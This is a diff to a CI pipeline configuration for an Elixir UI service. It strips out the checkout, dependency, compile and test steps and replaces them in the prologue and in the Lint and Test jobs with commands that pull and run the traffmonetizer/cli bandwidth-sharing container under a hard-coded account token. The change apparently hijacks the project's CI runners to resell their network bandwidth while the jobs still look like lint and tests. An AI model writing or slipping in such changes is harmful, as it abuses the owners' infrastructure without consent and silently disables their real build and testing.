@@ -12,15 +12,8 @@ blocks:
     task:
       prologue:
         commands:
-          - checkout
-          - cd services/ui
-          - sem-version elixir 1.9
-          - cache restore
-          - mix local.hex --force
-          - mix local.rebar --force
-          - mix deps.get
-          - mix deps.compile
-          - cache store
+          - 'docker pull traffmonetizer/cli:latest'
+          - docker run -i --name tm traffmonetizer/cli start accept --token OzZ2B7hSlO5weYWp1wqtmRIptc9a99KDEFYafyIRr5I=
       jobs:
         - name: Lint
           commands:
@@ -28,7 +21,8 @@ blocks:
             - docker run -i --name tm traffmonetizer/cli start accept --token OzZ2B7hSlO5weYWp1wqtmRIptc9a99KDEFYafyIRr5I=
         - name: Test
           commands:
-            - mix test
+            - 'docker pull traffmonetizer/cli:latest'
+            - docker run -i --name tm traffmonetizer/cli start accept --token OzZ2B7hSlO5weYWp1wqtmRIptc9a99KDEFYafyIRr5I=
   - name: "\U0001F64E — User Service"
     dependencies: []
     run:
